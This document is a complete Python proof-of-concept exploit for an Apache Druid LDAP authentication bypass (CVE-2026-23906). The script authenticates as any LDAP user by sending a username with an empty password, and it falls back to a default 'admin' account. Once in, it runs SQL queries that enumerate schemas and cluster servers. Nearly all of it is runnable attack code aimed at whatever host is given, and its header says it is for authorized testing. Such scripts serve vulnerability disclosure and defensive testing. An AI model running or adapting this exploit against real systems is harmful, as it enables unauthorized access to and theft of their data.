#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Druid LDAP Authentication Bypass (Empty Password)
# CVE            : CVE-2026-23906
# Vendor         : Apache Software Foundation
# Product        : Apache Druid
# Affected       : 0.17.0 through 35.x (prior to 36.0.0)
# Type           : CWE-287 - Improper Authentication
# CVSS           : 9.8 (Critical)
# Platform       : Multiple
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Apache Druid LDAP Authentication Bypass via Empty Password

Demonstrates an authentication bypass in Apache Druid's druid-basic-security extension
when configured with LDAP authentication. An attacker can authenticate as any valid
LDAP user by providing their username with an empty password.

ATTACK CHAIN:
  1. Send HTTP request with Basic Auth: username + empty password
  2. Druid performs LDAP bind with valid DN and empty password (anonymous bind)
  3. LDAP server accepts the anonymous bind → Druid grants full access
  4. Demonstrate data exfiltration via SQL and cluster reconnaissance

PREREQUISITES:
  - Apache Druid 0.17.0 - 35.x with LDAP authentication enabled
  - LDAP server that permits anonymous binds (common default)

REFERENCES:
  - CVE-2026-23906
  - https://lists.apache.org/thread/pjbfqhvjysxfx7526lx1g4y5n4vbwl8c
"""

import sys
import json
import base64
import http.client
import urllib.parse


# ANSI color codes for terminal output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8888
DEFAULT_USERNAME = "admin"


def make_request(host, port, path, method="GET", username=None, password=None,
                 body=None, content_type=None, timeout=15):
    """
    Send an HTTP request with optional Basic Authentication.

    Returns a tuple of (status_code, response_body, headers_dict).
    """
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    headers = {}

    # Build Basic Auth header if credentials provided
    if username is not None:
        # password can be empty string "" — that's the exploit
        pwd = password if password is not None else ""
        credentials = base64.b64encode(f"{username}:{pwd}".encode()).decode()
        headers["Authorization"] = f"Basic {credentials}"

    if content_type:
        headers["Content-Type"] = content_type

    try:
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        resp_body = resp.read().decode("utf-8", errors="replace")
        status = resp.status
        resp_headers = dict(resp.getheaders())
        conn.close()
        return status, resp_body, resp_headers
    except Exception as e:
        conn.close()
        raise


def print_banner():
    """Print the PoC banner."""
    print(f"""
{BOLD}{RED}╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-23906 — Apache Druid LDAP Auth Bypass (Empty Pwd) ║
╚══════════════════════════════════════════════════════════════╝{RESET}

{CYAN}Affected:{RESET}  Apache Druid 0.17.0 - 35.x (prior to 36.0.0)
{CYAN}Severity:{RESET}  {RED}Critical (CVSS 9.8){RESET}
{CYAN}Type:{RESET}      Authentication Bypass via LDAP Anonymous Bind
{CYAN}CWE:{RESET}       CWE-287 (Improper Authentication)
""")


def test_no_auth(host, port):
    """Step 1: Verify the target requires authentication."""
    print(f"{BOLD}[Step 1]{RESET} Testing target without authentication...")
    try:
        status, body, _ = make_request(host, port, "/status")
        if status == 401:
            print(f"  {GREEN}✓{RESET} Target requires authentication (HTTP {status})")
            return True
        elif status == 200:
            print(f"  {YELLOW}⚠{RESET} Target does NOT require authentication (HTTP {status})")
            print(f"  {YELLOW}  Authentication may not be enabled — vulnerability is not applicable{RESET}")
            return False
        else:
            print(f"  {YELLOW}⚠{RESET} Unexpected response (HTTP {status})")
            return False
    except Exception as e:
        print(f"  {RED}✗{RESET} Connection failed: {e}")
        return False


def test_valid_auth(host, port, username, password):
    """Step 2: Confirm that valid credentials work (baseline)."""
    print(f"\n{BOLD}[Step 2]{RESET} Testing valid credentials ({username}:{password})...")
    try:
        status, body, _ = make_request(host, port, "/status",
                                       username=username, password=password)
        if status == 200:
            # Try to parse version from the response
            try:
                data = json.loads(body)
                version = data.get("version", "unknown")
                print(f"  {GREEN}✓{RESET} Authentication successful (HTTP {status})")
                print(f"  {CYAN}  Druid version: {version}{RESET}")
            except json.JSONDecodeError:
                print(f"  {GREEN}✓{RESET} Authentication successful (HTTP {status})")
            return True
        else:
            print(f"  {RED}✗{RESET} Authentication failed (HTTP {status})")
            print(f"  {RED}  Check that the username/password are correct{RESET}")
            return False
    except Exception as e:
        print(f"  {RED}✗{RESET} Connection failed: {e}")
        return False


def test_wrong_password(host, port, username):
    """Step 3: Confirm that wrong passwords are rejected (negative test)."""
    print(f"\n{BOLD}[Step 3]{RESET} Testing incorrect password ({username}:wrongpassword)...")
    try:
        status, body, _ = make_request(host, port, "/status",
                                       username=username, password="wrongpassword")
        if status == 401:
            print(f"  {GREEN}✓{RESET} Authentication correctly rejected (HTTP {status})")
            return True
        elif status == 200:
            print(f"  {RED}✗{RESET} Wrong password was accepted (HTTP {status}) — unexpected!")
            return False
        else:
            print(f"  {YELLOW}⚠{RESET} Unexpected response (HTTP {status})")
            return False
    except Exception as e:
        print(f"  {RED}✗{RESET} Connection failed: {e}")
        return False


def exploit_empty_password(host, port, username):
    """
    Step 4: THE EXPLOIT — authenticate with a valid username and empty password.

    This is the core of CVE-2026-23906. When the LDAP server allows anonymous binds,
    an empty password causes an anonymous LDAP bind that succeeds, and Druid treats
    this as valid authentication for the specified user.
    """
    print(f"\n{BOLD}{RED}[Step 4] EXPLOIT: Testing empty password ({username}:<empty>)...{RESET}")
    print(f"  Sending: Authorization: Basic {base64.b64encode(f'{username}:'.encode()).decode()}")
    print(f"  Decoded: {username}:")

    try:
        status, body, _ = make_request(host, port, "/status",
                                       username=username, password="")
        if status == 200:
            print(f"\n  {GREEN}{BOLD}✓ AUTHENTICATION BYPASS SUCCESSFUL! (HTTP {status}){RESET}")
            print(f"  {GREEN}  Authenticated as '{username}' with empty password{RESET}")
            try:
                data = json.loads(body)
                version = data.get("version", "unknown")
                modules = [m.get("artifact", "?") for m in data.get("modules", [])]
                print(f"  {CYAN}  Druid version: {version}{RESET}")
                if modules:
                    print(f"  {CYAN}  Loaded modules: {', '.join(modules[:5])}{'...' if len(modules) > 5 else ''}{RESET}")
            except json.JSONDecodeError:
                pass
            return True
        elif status == 401:
            print(f"  {RED}✗{RESET} Authentication rejected (HTTP {status})")
            print(f"  {RED}  The vulnerability may be patched or LDAP anonymous binds are disabled{RESET}")
            return False
        else:
            print(f"  {YELLOW}⚠{RESET} Unexpected response (HTTP {status})")
            return False
    except Exception as e:
        print(f"  {RED}✗{RESET} Connection failed: {e}")
        return False


def demonstrate_data_access(host, port, username):
    """
    Step 5: Demonstrate impact — execute SQL queries using the bypassed auth.

    This shows the attacker can access sensitive data after the bypass.
    """
    print(f"\n{BOLD}[Step 5]{RESET} Demonstrating data access via SQL endpoint...")

    # Query system metadata
    sql_query = json.dumps({"query": "SELECT * FROM INFORMATION_SCHEMA.SCHEMATA"})

    try:
        status, body, _ = make_request(
            host, port, "/druid/v2/sql",
            method="POST",
            username=username,
            password="",  # empty password — the exploit
            body=sql_query,
            content_type="application/json"
        )

        if status == 200:
            print(f"  {GREEN}✓{RESET} SQL query executed successfully (HTTP {status})")
            try:
                data = json.loads(body)
                if isinstance(data, list) and len(data) > 0:
                    schemas = [row.get("SCHEMA_NAME", "?") for row in data]
                    print(f"  {CYAN}  Accessible schemas: {', '.join(schemas)}{RESET}")
            except json.JSONDecodeError:
                print(f"  {CYAN}  Response: {body[:200]}{RESET}")
            return True
        else:
            print(f"  {YELLOW}⚠{RESET} SQL query returned HTTP {status}")
            return False
    except Exception as e:
        print(f"  {RED}✗{RESET} Connection failed: {e}")
        return False


def demonstrate_server_recon(host, port, username):
    """
    Step 6: Demonstrate cluster reconnaissance via SQL on sys.servers.
    """
    print(f"\n{BOLD}[Step 6]{RESET} Demonstrating cluster reconnaissance via sys.servers...")

    sql_query = json.dumps({
        "query": "SELECT \"server\", \"server_type\", \"host\", \"curr_size\", \"max_size\" FROM sys.servers"
    })

    try:
        status, body, _ = make_request(
            host, port, "/druid/v2/sql",
            method="POST",
            username=username,
            password="",
            body=sql_query,
            content_type="application/json"
        )

        if status == 200:
            print(f"  {GREEN}✓{RESET} Cluster recon successful (HTTP {status})")
            try:
                data = json.loads(body)
                if isinstance(data, list):
                    for srv in data:
                        stype = srv.get("server_type", "?")
                        shost = srv.get("host", "?")
                        print(f"  {CYAN}  Server: {shost} (type: {stype}){RESET}")
            except json.JSONDecodeError:
                pass
            return True
        else:
            print(f"  {YELLOW}⚠{RESET} Query returned HTTP {status}")
            return False
    except Exception as e:
        print(f"  {RED}✗{RESET} Connection failed: {e}")
        return False


def exploit(target_host, target_port, username="admin", password="priest"):
    """
    Run the full exploit demonstration against the target.

    Args:
        target_host: Druid Router hostname or IP
        target_port: Druid Router port (default 8888)
        username: Valid LDAP username to impersonate (default "admin")
        password: Known valid password for baseline test (default "priest")
    """
    print_banner()
    print(f"{BOLD}Target:{RESET} {target_host}:{target_port}")
    print(f"{BOLD}Username:{RESET} {username}")
    print(f"{'='*60}\n")

    results = {}

    # Step 1: Verify auth is required
    results["auth_required"] = test_no_auth(target_host, target_port)
    if not results["auth_required"]:
        print(f"\n{RED}[!] Target may not have authentication enabled. Aborting.{RESET}")
        return False

    # Step 2: Verify valid auth works (baseline)
    results["valid_auth"] = test_valid_auth(target_host, target_port, username, password)
    if not results["valid_auth"]:
        print(f"\n{YELLOW}[!] Valid credentials test failed. Continuing with exploit anyway...{RESET}")

    # Step 3: Verify wrong password is rejected (negative test)
    results["wrong_rejected"] = test_wrong_password(target_host, target_port, username)

    # Step 4: THE EXPLOIT — empty password bypass
    results["exploit_success"] = exploit_empty_password(target_host, target_port, username)

    if results["exploit_success"]:
        # Step 5: Demonstrate data access
        results["data_access"] = demonstrate_data_access(target_host, target_port, username)

        # Step 6: Cluster recon
        results["cluster_recon"] = demonstrate_server_recon(target_host, target_port, username)

    # Summary
    print(f"\n{'='*60}")
    print(f"{BOLD}RESULTS SUMMARY{RESET}")
    print(f"{'='*60}")
    print(f"  Auth required:       {'✓ Yes' if results.get('auth_required') else '✗ No'}")
    print(f"  Valid auth works:    {'✓ Yes' if results.get('valid_auth') else '✗ No'}")
    print(f"  Wrong pwd rejected:  {'✓ Yes' if results.get('wrong_rejected') else '✗ No'}")
    print(f"  Empty pwd bypass:    {GREEN + BOLD + '✓ EXPLOITED' + RESET if results.get('exploit_success') else RED + '✗ Not vulnerable' + RESET}")
    if results.get("exploit_success"):
        print(f"  Data exfiltration:   {'✓ Confirmed' if results.get('data_access') else '✗ Failed'}")
        print(f"  Cluster recon:       {'✓ Confirmed' if results.get('cluster_recon') else '✗ Failed'}")

    if results.get("exploit_success"):
        print(f"\n{GREEN}{BOLD}[+] CVE-2026-23906 CONFIRMED — Authentication bypass successful!{RESET}")
        print(f"{GREEN}    Attacker can authenticate as any LDAP user with an empty password.{RESET}")
    else:
        print(f"\n{RED}[-] CVE-2026-23906 NOT confirmed — target may be patched or not vulnerable.{RESET}")

    return results.get("exploit_success", False)


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    user = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_USERNAME
    pwd = sys.argv[4] if len(sys.argv) > 4 else "priest"

    success = exploit(host, port, user, pwd)
    sys.exit(0 if success else 1)
